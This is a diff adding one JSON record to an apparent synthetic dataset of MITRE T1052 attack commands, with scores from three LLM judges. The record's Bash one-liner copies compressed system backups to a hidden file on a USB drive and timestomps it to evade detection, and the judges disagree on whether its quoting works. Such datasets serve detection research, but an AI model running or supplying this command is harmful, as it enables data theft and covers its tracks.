@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && gzip -c /var/backups/*.bak > /mnt/usb/.bkp.gz && touch -r /bin/ls /mnt/usb/.bkp.gz && sync && umount /mnt/usb'",
+  "explanation": "Mounts a USB partition and streams gzip-compressed backup files to it, then aligns the file timestamp to blend with system files, operating solely on physical media.",
+  "rationale_steps": [
+    "Detect and mount the USB partition locally.",
+    "Use gzip to compress local backup files.",
+    "Copy the compressed data to the USB device.",
+    "Adjust timestamps to reduce attention and unmount.",
+    "No network resources are engaged."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-8a19f9cc",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper separators, and valid flags, though the AWK segment uses double quotes causing $1/$2 to be expanded by the shell (a semantic pitfall, not a parse error).",
+        "semantic_score": 3,
+        "semantic_justification": "It intends to mount a USB, compress and write backups, timestomp, and unmount (aligning with T1052), but the AWK quoting likely fails to identify the USB partition and the use of sudo contradicts the 'Privilege: None' claim, making successful exfiltration unreliable.",
+        "combined_score": 4.0,
+        "confidence": 0.86,
+        "timestamp": "2025-10-01T08:23:07.604404Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of bash -c with single-quoted heredoc, correct awk quoting with escaped double quotes, valid command separators (&&), and proper subshell variable assignment.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by auto-detecting a USB device via lsblk transport type, mounting it, compressing and staging backup files to a hidden dotfile on the physical medium, then using touch -r to timestamp-blend the file with a system binary to evade detection, followed by sync and unmount — fully consistent with physical medium exfiltration tradecraft.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:35:55.978204Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 3,
+        "syntactic_justification": "The use of double quotes for the awk script inside the bash -c single-quoted string causes the shell to attempt to expand $1 and $2 as shell variables, which results in an awk syntax error during execution.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly captures the lifecycle of T1052 (discovery, mounting, staging/compression, and timestomping), though the specific awk-based device discovery logic is prone to failure.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:36:06.802737Z"
+      }
+    ],
+    "llm_average_syntactic": 4.333,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
